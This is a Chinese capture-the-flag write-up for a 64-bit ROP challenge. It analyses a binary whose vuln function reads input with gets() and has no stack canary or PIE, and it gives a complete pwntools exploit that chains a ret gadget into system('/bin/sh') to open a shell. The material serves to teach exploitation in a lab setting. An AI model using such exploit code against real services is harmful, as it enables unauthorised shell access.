# ROP链

- 作者：pn1fg
- 参考：
- 难度：Medium
- 分类：Pwn
- 镜像：-
- 端口：70

# 题目描述

最简单的ROP链

# 题目解析

- 源码：[pwn.c](build/pwn.c)
- 考点：64位ROP链

由于出题目的时间跨度有点大，导致本题与上题`ret2text_64`题目重合，为表达歉意，我们就不更换题目了，这道题目赠送给各位同学们

这里和同学们简单分析一下

#### 查看文件信息

查看文件类型：

```shell
>>> file pwn
pwn: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=9c5a0203058595c56d22e89b7c4b45869bb959de, for GNU/Linux 3.2.0, not stripped
```

64位 ELF 文件，动态链接，没有去除符号

查看保护机制：

```shell
>>> checksec --file=pwn
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

NX 保护

#### 分析漏洞成因

反编译`vuln`函数

```c
void sym.vuln(void)

{
    ulong s;

    sym.imp.system("echo You know the size of the input data?");
    sym.imp.gets(&s);
    return;
}
```

`gets`函数可以读入无限制长度的字符（直到换行`\n`），导致超出`s`长度，覆盖`rbp`，造成栈溢出

构造利用都与上题一致

#### 编写利用程序：

exp 也可以和上题共用，这里就演示一个

[exp.py](writeup/exp.py)

```python
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

if args['REMOTE']:
    io = remote(IP,port)
else:
    io = process('./pwn')

elf = ELF("./pwn")
rop = ROP(elf)

rop.raw(cyclic(0x70 + 8))
rop.raw(rop.find_gadget(["ret"]))
rop.call(elf.sym["system"], [next(elf.search(b"/bin/sh"))])

payload = rop.chain()
io.sendlineafter(b'a?\n',payload)
io.interactive()
```
